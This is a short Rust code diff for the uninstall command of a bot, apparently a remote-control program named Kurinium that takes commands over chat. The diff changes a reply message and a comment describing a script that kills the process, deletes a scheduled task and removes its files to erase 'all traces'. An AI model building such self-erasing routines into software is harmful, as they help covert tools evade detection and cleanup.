@@ -22,7 +22,7 @@ impl BotCommand for UninstallCommand {
 
     async fn execute(&self, http: &Arc<HttpClient>, msg: &Message, _args: Arguments) -> Result<()> {
         http.create_message(msg.channel_id)
-            .content("Uninstalling and removing all traces... Goodbye, cruel world!")
+            .content("**Removed Kurinium successfully.**")
             .await?;
 
         self.sched_uninstall()?;
@@ -40,7 +40,7 @@ impl UninstallCommand {
         let install_dir = curr_exe.parent().context("Failed to get parent directory")?;
         let install_dir_path = install_dir.to_string_lossy().to_string();
 
-        // commnt: script to kill proc, del task, del file, del dir
+        // script to kill proc, del task, del file, del dir
         let script = format!(
             r#"
 Start-Sleep -Seconds 3
